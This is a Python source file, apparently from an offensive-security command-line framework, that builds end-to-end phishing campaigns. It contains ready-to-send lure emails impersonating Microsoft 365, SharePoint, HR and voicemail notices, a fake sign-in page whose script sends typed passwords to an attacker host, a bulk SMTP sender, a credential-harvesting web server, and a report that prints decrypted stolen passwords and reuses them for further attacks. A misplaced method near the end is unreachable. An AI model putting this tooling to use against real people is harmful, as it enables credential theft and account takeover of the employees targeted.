"""Phishing Wizard command set.

End-to-end phishing campaign wizard with step-by-step interactive flow:
target profiling -> template selection -> landing page generation -> sending
-> tracking -> credential capture -> automatic config update.
"""

from __future__ import annotations

import datetime
import json
import os
import secrets
import shlex
import smtplib
import time
import uuid
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import cmd2

from cli.commands._base import LazyOwnCommandSet
from modules.phishing_orchestrator import (
    SESSIONS_DIR,
    _decrypt_credential,
    _encrypt_credential,
    _hash_credential_for_log,
)
from utils import (
    print_error,
    print_msg,
    print_warn,
)

PHISHING_CATEGORY = "01. Initial Access"

BUILTIN_TEMPLATES = {
    "microsoft_365": {
        "subject": "Action Required: Your Microsoft 365 password expires today",
        "body": """<html><body style="font-family:Arial,sans-serif">
<h2>Password Expiry Notice</h2>
<p>Dear {first_name},</p>
<p>Your Microsoft 365 password expires in <b>{duration}</b>.</p>
<p>Please update it now to avoid losing access:</p>
<p><a href="{phishing_url}" style="background:#0078d4;color:white;padding:10px 20px;text-decoration:none;border-radius:4px">Update Password</a></p>
<p>This link expires in 24 hours.</p>
<p>IT Department<br>{company}</p>
</body></html>""",
        "sender_name": "IT Support",
    },
    "password_reset": {
        "subject": "Security Alert: Password Reset Required",
        "body": """<html><body style="font-family:Arial,sans-serif">
<h2>Security Alert</h2>
<p>Dear {first_name},</p>
<p>We detected unusual activity on your account. For your protection, you must <b>reset your password</b> immediately.</p>
<p><a href="{phishing_url}" style="background:#d32f2f;color:white;padding:10px 20px;text-decoration:none;border-radius:4px">Reset Password Now</a></p>
<p>If you did not request this, please contact the security team.</p>
<p>Security Operations<br>{company}</p>
</body></html>""",
        "sender_name": "Security Team",
    },
    "sharepoint": {
        "subject": "{first_name}, a document has been shared with you",
        "body": """<html><body style="font-family:Arial,sans-serif">
<h2>Document Shared</h2>
<p>Hi {first_name},</p>
<p>A confidential document has been shared with you on SharePoint.</p>
<p><a href="{phishing_url}" style="background:#0078d4;color:white;padding:10px 20px;text-decoration:none;border-radius:4px">View Document</a></p>
<p>The link expires in 48 hours.</p>
<p>{company}</p>
</body></html>""",
        "sender_name": "SharePoint Online",
    },
    "voicemail": {
        "subject": "New Voicemail from {sender_number}",
        "body": """<html><body style="font-family:Arial,sans-serif">
<h2>New Voicemail</h2>
<p>Hi {first_name},</p>
<p>You received a new voicemail ({duration}) from <b>{sender_number}</b>.</p>
<p><a href="{phishing_url}" style="background:#0078d4;color:white;padding:10px 20px;text-decoration:none;border-radius:4px">Listen to Voicemail</a></p>
<p>{company} Unified Messaging</p>
</body></html>""",
        "sender_name": "Voicemail System",
    },
    "hr_policy": {
        "subject": "Updated Employee Handbook - Action Required",
        "body": """<html><body style="font-family:Arial,sans-serif">
<h2>Policy Update</h2>
<p>Dear {first_name},</p>
<p>The employee handbook has been updated. Please <b>review and acknowledge</b> the changes.</p>
<p><a href="{phishing_url}" style="background:#0078d4;color:white;padding:10px 20px;text-decoration:none;border-radius:4px">Review Policy</a></p>
<p>Deadline: {deadline}</p>
<p>Human Resources<br>{company}</p>
</body></html>""",
        "sender_name": "Human Resources",
    },
}

ROLE_PREFIXES = [
    "admin",
    "info",
    "it",
    "hr",
    "sales",
    "security",
    "support",
    "noc",
    "soc",
    "helpdesk",
    "contact",
    "office",
    "marketing",
    "finance",
    "legal",
    "compliance",
    "operations",
    "webmaster",
    "postmaster",
    "abuse",
]

LANDING_PAGE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{page_title}</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
.login-box {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; max-width: 90vw; }}
.logo {{ text-align: center; margin-bottom: 24px; font-size: 28px; color: {accent_color}; }}
h2 {{ text-align: center; margin-bottom: 24px; color: #333; }}
input {{ width: 100%; padding: 12px; margin-bottom: 16px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }}
button {{ width: 100%; padding: 12px; background: {accent_color}; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
button:hover {{ opacity: 0.9; }}
.error {{ color: #d32f2f; text-align: center; margin-top: 12px; display: none; }}
.footer {{ text-align: center; margin-top: 24px; color: #888; font-size: 12px; }}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">{logo_html}</div>
<h2>Sign in to {service_name}</h2>
<form id="loginForm">
<input type="email" name="email" placeholder="Email address" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
<div class="error" id="errorMsg">Incorrect email or password. Please try again.</div>
</form>
<div class="footer">{year} {company_name}</div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {{
e.preventDefault();
const email = this.querySelector('input[name="email"]').value;
const password = this.querySelector('input[name="password"]').value;
try {{
    await fetch('{harvest_endpoint}', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{email, password, timestamp: new Date().toISOString()}})
    }});
}} catch(err) {{}}
document.getElementById('errorMsg').style.display = 'block';
setTimeout(function() {{ window.location.href = '{redirect_url}'; }}, 2000);
}});
</script>
</body>
</html>"""

SERVICE_LOGOS = {
    "microsoft_365": "Microsoft 365",
    "password_reset": "Corporate Portal",
    "sharepoint": "SharePoint Online",
    "voicemail": "Voicemail",
    "hr_policy": "Employee Portal",
}


class PhishingWizardCommandSet(LazyOwnCommandSet):
    """End-to-end phishing campaign wizard."""

    phase = "recon"
    category = PHISHING_CATEGORY

    @cmd2.with_category(PHISHING_CATEGORY)
    def do_phish_wizard(self, line):
        """Interactive end-to-end phishing campaign wizard.

        Usage: phish_wizard

        Walks through: target profiling -> template selection -> landing page
        generation -> email sending -> credential harvesting.
        """
        print_msg("=== Phishing Campaign Wizard ===")
        print_msg("")

        domain = self.params.get("domain", "") or self.params.get("rhost", "")
        lhost = self.params.get("lhost", "")
        if not lhost:
            lhost = input("    [!] Attacker IP (lhost): ").strip()

        if not domain:
            domain = input("    [!] Target domain (e.g. company.com): ").strip()

        if not domain:
            print_error("Target domain is required.")
            return

        campaign_id = uuid.uuid4().hex[:12]
        campaign_dir = f"sessions/phishing_{campaign_id}"
        os.makedirs(campaign_dir, exist_ok=True)

        print_msg(f"\n[*] Campaign ID: {campaign_id}")
        print_msg(f"[*] Target domain: {domain}")
        print_msg(f"[*] Attacker IP: {lhost}")

        # Step 1: Target profiling
        print_msg("\n--- Step 1: Target Profiling ---")
        targets = _profile_targets(domain)
        print_msg(f"Generated {len(targets)} targets:")
        for t in targets[:10]:
            print_msg(f"  {t}")
        if len(targets) > 10:
            print_msg(f"  ... and {len(targets) - 10} more")

        custom = input("\n    [!] Add custom email (or press Enter to continue): ").strip()
        if custom:
            targets = [custom] + targets

        _save_targets(campaign_dir, targets)

        # Step 2: Template selection
        print_msg("\n--- Step 2: Template Selection ---")
        for name in BUILTIN_TEMPLATES:
            tpl = BUILTIN_TEMPLATES[name]
            print_msg(f"  [{name}] {tpl['subject']}")

        template_name = input("\n    [!] Select template (default: microsoft_365): ").strip() or "microsoft_365"
        if template_name not in BUILTIN_TEMPLATES:
            print_warn("Unknown template, using microsoft_365")
            template_name = "microsoft_365"

        template = BUILTIN_TEMPLATES[template_name]

        # Step 3: Landing page
        print_msg("\n--- Step 3: Landing Page ---")
        phishing_url = f"http://{lhost}:8888/phish/{campaign_id}"
        harvest_url = f"http://{lhost}:8888/harvest/{campaign_id}"
        redirect_url = f"https://{domain}"

        service_name = SERVICE_LOGOS.get(template_name, "Corporate Portal")
        accent_color = "#0078d4"
        if template_name == "password_reset":
            accent_color = "#d32f2f"

        landing_html = LANDING_PAGE_HTML.format(
            page_title=service_name,
            accent_color=accent_color,
            logo_html=service_name,
            service_name=service_name,
            harvest_endpoint=harvest_url,
            redirect_url=redirect_url,
            year=datetime.datetime.now().year,
            company_name=domain.upper(),
        )

        landing_path = os.path.join(campaign_dir, "index.html")
        with open(landing_path, "w") as f:
            f.write(landing_html)
        print_msg(f"Landing page: {landing_path}")
        print_msg(f"Phishing URL: {phishing_url}")

        # Step 4: Email sending
        print_msg("\n--- Step 4: Email Sending ---")
        smtp_server = input("    [!] SMTP server (default: smtp.gmail.com): ").strip() or "smtp.gmail.com"
        smtp_port = int(input("    [!] SMTP port (default: 587): ").strip() or "587")
        sender_email = input("    [!] Sender email: ").strip()
        sender_password = input("    [!] Sender password (app password for Gmail): ").strip()

        if not sender_email or not sender_password:
            print_warn("No SMTP credentials. Generating preview files instead.")
            preview_dir = os.path.join(campaign_dir, "previews")
            os.makedirs(preview_dir, exist_ok=True)
            for idx, target in enumerate(targets[:20]):
                first_name = (
                    target.split("@")[0].split(".")[0].title() if "." in target else target.split("@")[0].title()
                )
                html_body = template["body"].format(
                    first_name=first_name,
                    phishing_url=phishing_url,
                    company=domain.upper(),
                    duration="24 hours",
                    sender_number="+1-555-0199",
                    deadline="Friday, 5:00 PM",
                )
                preview_path = os.path.join(preview_dir, f"email_{idx:03d}.html")
                with open(preview_path, "w") as f:
                    f.write(html_body)
            print_msg(f"Generated {min(len(targets), 20)} preview files in {preview_dir}")
        else:
            sent = 0
            failed = 0
            for idx, target in enumerate(targets[:50]):
                first_name = (
                    target.split("@")[0].split(".")[0].title() if "." in target else target.split("@")[0].title()
                )
                html_body = template["body"].format(
                    first_name=first_name,
                    phishing_url=phishing_url,
                    company=domain.upper(),
                    duration="24 hours",
                    sender_number="+1-555-0199",
                    deadline="Friday, 5:00 PM",
                )
                sender_name = template.get("sender_name", "IT Support")
                if _send_smtp_email(
                    smtp_server,
                    smtp_port,
                    sender_email,
                    sender_password,
                    target,
                    f"{sender_name} <{sender_email}>",
                    template["subject"].format(first_name=first_name, duration="24 hours", sender_number="+1-555-0199"),
                    html_body,
                ):
                    sent += 1
                else:
                    failed += 1
                if (idx + 1) % 10 == 0:
                    print_msg(f"  Sent {idx + 1}/{min(len(targets), 50)}")
                time.sleep(2)

            print_msg(f"Sent: {sent}, Failed: {failed}")

        # Step 5: Campaign metadata
        campaign_meta = {
            "campaign_id": campaign_id,
            "domain": domain,
            "template": template_name,
            "lhost": lhost,
            "phishing_url": phishing_url,
            "harvest_url": harvest_url,
            "targets_count": len(targets),
            "launched_at": time.time(),
            "smtp_server": smtp_server if sender_email else None,
            "sender_email": sender_email or None,
        }
        with open(os.path.join(campaign_dir, "campaign.json"), "w") as f:
            json.dump(campaign_meta, f, indent=2)

        print_msg(f"\n=== Campaign Ready: {campaign_id} ===")
        print_msg(f"Landing page: {phishing_url}")
        print_msg(f"Credentials will be logged to: {campaign_dir}/credentials.json")
        print_msg(f"Start the phishing server: phish_serve {campaign_id}")

    @cmd2.with_category(PHISHING_CATEGORY)
    def do_phish_serve(self, line):
        """Start a lightweight HTTP server for phishing landing pages.

        Usage: phish_serve <campaign_id> [--port <port>]

        Serves landing pages from sessions/phishing_<campaign_id>/index.html
        and handles credential harvesting at /harvest/<campaign_id>.
        """
        args = shlex.split(line)
        if not args:
            print_error("Usage: phish_serve <campaign_id> [--port <port>]")
            return

        campaign_id = args[0]
        port = int(_extract_flag(args, "--port") or "8888")
        campaign_dir = f"sessions/phishing_{campaign_id}"

        if not os.path.exists(campaign_dir):
            print_error(f"Campaign not found: {campaign_id}")
            return

        print_msg(f"Starting phishing server on port {port} for campaign {campaign_id}")
        print_msg(f"Landing page: http://0.0.0.0:{port}/phish/{campaign_id}")
        print_msg(f"Harvest endpoint: http://0.0.0.0:{port}/harvest/{campaign_id}")

        from http.server import BaseHTTPRequestHandler, HTTPServer

        class PhishingHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass

            def do_GET(self):
                if self.path == f"/phish/{campaign_id}" or self.path == f"/{campaign_id}":
                    landing_path = os.path.join(campaign_dir, "index.html")
                    if os.path.exists(landing_path):
                        self.send_response(200)
                        self.send_header("Content-Type", "text/html")
                        self.end_headers()
                        with open(landing_path, "rb") as f:
                            self.wfile.write(f.read())
                        _log_click(campaign_dir, self.client_address[0], self.headers.get("User-Agent", ""))
                    else:
                        self.send_error(404)
                else:
                    self.send_error(404)

            def do_POST(self):
                if self.path == f"/harvest/{campaign_id}":
                    content_length = int(self.headers.get("Content-Length", 0))
                    body = self.rfile.read(content_length)
                    try:
                        data = json.loads(body)
                        _log_credentials(
                            campaign_dir, data.get("email", ""), data.get("password", ""), self.client_address[0]
                        )
                        print_msg(f"  Credentials captured: {data.get('email')}")
                    except json.JSONDecodeError:
                        pass
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.end_headers()
                    self.wfile.write(b'{"status":"ok"}')
                else:
                    self.send_error(404)

            def do_OPTIONS(self):
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
                self.send_header("Access-Control-Allow-Headers", "Content-Type")
                self.end_headers()

        server = HTTPServer(("0.0.0.0", port), PhishingHandler)
        print_msg("Press Ctrl+C to stop the server.")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print_msg("\nServer stopped.")
            server.server_close()

    @cmd2.with_category(PHISHING_CATEGORY)
    def do_phish_report(self, line):
        """Show campaign results and captured credentials.

        Usage: phish_report <campaign_id>

        Displays click count, captured credentials, and campaign stats.
        """
        args = shlex.split(line)
        if not args:
            print_error("Usage: phish_report <campaign_id>")
            return

        campaign_id = args[0]
        campaign_dir = f"sessions/phishing_{campaign_id}"

        if not os.path.exists(campaign_dir):
            print_error(f"Campaign not found: {campaign_id}")
            return

        meta_path = os.path.join(campaign_dir, "campaign.json")
        clicks_path = os.path.join(campaign_dir, "clicks.json")
        creds_path = os.path.join(campaign_dir, "credentials.json")

        if os.path.exists(meta_path):
            with open(meta_path) as f:
                meta = json.load(f)
            print_msg(f"Campaign: {campaign_id}")
            print_msg(f"  Domain: {meta.get('domain')}")
            print_msg(f"  Template: {meta.get('template')}")
            print_msg(f"  Targets: {meta.get('targets_count')}")
            print_msg(f"  Phishing URL: {meta.get('phishing_url')}")

        clicks = []
        if os.path.exists(clicks_path):
            with open(clicks_path) as f:
                clicks = json.load(f)
        print_msg(f"\nClicks: {len(clicks)}")
        for c in clicks[:10]:
            print_msg(f"  {c.get('timestamp', '?')} - {c.get('ip', '?')} - {c.get('ua', '?')[:60]}")

        creds = []
        if os.path.exists(creds_path):
            with open(creds_path) as f:
                creds = json.load(f)
        print_msg(f"\nCredentials captured: {len(creds)}")
        for c in creds[:20]:
            try:
                password = _decrypt_credential(c.get("password", ""))
            except (ValueError, RuntimeError):
                password = "<undecryptable>"
            print_msg(f"  {c.get('email')} : {password}")

        if creds:
            use = input("\n    [!] Use first captured credential for further attacks? (y/N): ").strip().lower()
            if use == "y":
                first = creds[0]
                from utils import lazyown_set_config

                try:
                    plain_password = _decrypt_credential(first.get("password", ""))
                except (ValueError, RuntimeError):
                    plain_password = ""
                lazyown_set_config("domain_user", first.get("email", ""))
                lazyown_set_config("domain_pass", plain_password)
                print_msg(f"Set domain_user={first.get('email')} domain_pass={plain_password}")


def _profile_targets(domain: str) -> list[str]:
    """Generate target email addresses from common role prefixes.

    Args:
        domain: Target domain name.

    Returns:
        List of email addresses.
    """
    return [f"{prefix}@{domain}" for prefix in ROLE_PREFIXES]


def _save_targets(campaign_dir: str, targets: list[str]) -> None:
    """Save target list to disk.

    Args:
        campaign_dir: Campaign directory path.
        targets: List of email addresses.
    """
    with open(os.path.join(campaign_dir, "targets.json"), "w") as f:
        json.dump(targets, f, indent=2)


def _log_click(campaign_dir: str, ip: str, user_agent: str) -> None:
    """Log a click event.

    Args:
        campaign_dir: Campaign directory path.
        ip: Source IP address.
        user_agent: User-Agent header.
    """
    clicks_path = os.path.join(campaign_dir, "clicks.json")
    clicks = []
    if os.path.exists(clicks_path):
        with open(clicks_path) as f:
            clicks = json.load(f)
    clicks.append({"ip": ip, "ua": user_agent, "timestamp": datetime.datetime.now().isoformat()})
    with open(clicks_path, "w") as f:
        json.dump(clicks, f, indent=2)


def _ensure_session_key() -> None:
    """Provision a machine-local secret key for credential encryption.

    Creates ``sessions/.secret_key`` with owner-only permissions when it is
    absent so the CLI campaign can encrypt harvested credentials without a
    pre-existing C2 bootstrap.

    Returns:
        None
    """
    secret_path = SESSIONS_DIR / ".secret_key"
    if secret_path.exists():
        return
    secret_path.parent.mkdir(parents=True, exist_ok=True)
    secret_path.write_text(secrets.token_hex(64), encoding="utf-8")
    os.chmod(secret_path, 0o600)


def _log_credentials(campaign_dir: str, email: str, password: str, ip: str) -> None:
    """Log captured credentials encrypted at rest and hashed in the audit log.

    Args:
        campaign_dir: Campaign directory path.
        email: Captured email/username.
        password: Captured password.
        ip: Source IP address.
    """
    _ensure_session_key()
    creds_path = os.path.join(campaign_dir, "credentials.json")
    creds = []
    if os.path.exists(creds_path):
        with open(creds_path) as f:
            creds = json.load(f)
    creds.append(
        {
            "email": email,
            "password": _encrypt_credential(password),
            "ip": ip,
            "timestamp": datetime.datetime.now().isoformat(),
        }
    )
    with open(creds_path, "w") as f:
        json.dump(creds, f, indent=2)
    os.chmod(creds_path, 0o600)

    global_creds_path = os.path.join(SESSIONS_DIR, "phishing_credentials.txt")
    with open(global_creds_path, "a") as f:
        f.write(
            f"{datetime.datetime.now().isoformat()} | {email} | {_hash_credential_for_log(password)} | {campaign_dir.split('_')[-1] if '_' in campaign_dir else campaign_dir}\n"
        )


def _send_smtp_email(
    server: str, port: int, username: str, password: str, to_email: str, from_addr: str, subject: str, html_body: str
) -> bool:
    """Send an email via SMTP.

    Args:
        server: SMTP server hostname.
        port: SMTP server port.
        username: SMTP username.
        password: SMTP password.
        to_email: Recipient address.
        from_addr: Sender display address.
        subject: Email subject.
        html_body: HTML email body.

    Returns:
        True if sent successfully.
    """
    try:
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = from_addr
        msg["To"] = to_email
        msg.attach(MIMEText(html_body, "html"))

        with smtplib.SMTP(server, port, timeout=30) as s:
            s.starttls()
            s.login(username, password)
            s.sendmail(username, to_email, msg.as_string())
        return True
    except Exception:
        return False

    @cmd2.with_category(PHISHING_CATEGORY)
    def do_phisher(self, line):
        """Launch a phishing campaign against a target domain.

        Profiles targets, generates email templates, clones landing pages,
        and tracks clicks and credential harvesting. Supports built-in
        templates (microsoft_365_login, sharepoint_share, password_reset,
        voicemail_notification, hr_policy_update) and custom templates.

        Modes:
            credential_harvest  - Clone login pages and collect credentials.
            payload_delivery    - Send weaponized attachments.
            callback_beacon     - Embed C2 callback URLs for initial access.

        Usage:
            phisher <domain> <template> [mode]
            phisher target.com microsoft_365_login
            phisher target.com password_reset credential_harvest
            phisher target.com custom_template.json

        Harvested credentials are saved to ``sessions/phishing_credentials.txt``.

        :param line: Domain, template name, and optional mode.
        :type line: str
        :return: None
        """
        parts = line.strip().split()
        if len(parts) < 2:
            print_error("Usage: phisher <domain> <template> [mode]")
            print_msg(
                "Available templates: microsoft_365_login, sharepoint_share, password_reset, voicemail_notification, hr_policy_update"
            )  # noqa: E501
            return

        target_domain = parts[0]
        template_name = parts[1]
        mode = parts[2] if len(parts) > 2 else "credential_harvest"

        try:
            from modules.phishing_orchestrator import PhishingOrchestrator

            phish = PhishingOrchestrator()
            print_msg(f"Launching phishing campaign against {target_domain}")
            print_msg(f"  Template: {template_name}")
            print_msg(f"  Mode: {mode}")

            targets = phish.profile_targets(target_domain)
            print_msg(f"  Targets profiled: {len(targets)}")
            for t in targets[:10]:
                print_msg(f"    {t.email} ({t.department})")

            campaign_id = phish.launch(
                target_domain=target_domain,
                template=template_name,
                mode=mode,
            )
            print_msg(f"Campaign launched: {campaign_id}")
            print_msg(f"Campaign data: sessions/phishing_{campaign_id}/")
            print_msg("Use the C2 dashboard to monitor clicks and credential captures.")
            self.display_toastr(f"Phishing campaign {campaign_id} launched against {target_domain}", type="info")
        except ImportError as exc:
            print_error(f"phishing_orchestrator module not available: {exc}")
        except Exception as exc:
            print_error(f"Phisher operation failed: {exc}")


def _extract_flag(args: list[str], flag: str) -> str | None:
    """Extract a ``--flag <value>`` pair from a list of arguments."""
    try:
        idx = args.index(flag)
        return args[idx + 1]
    except (ValueError, IndexError):
        return None


__all__ = ["PhishingWizardCommandSet"]
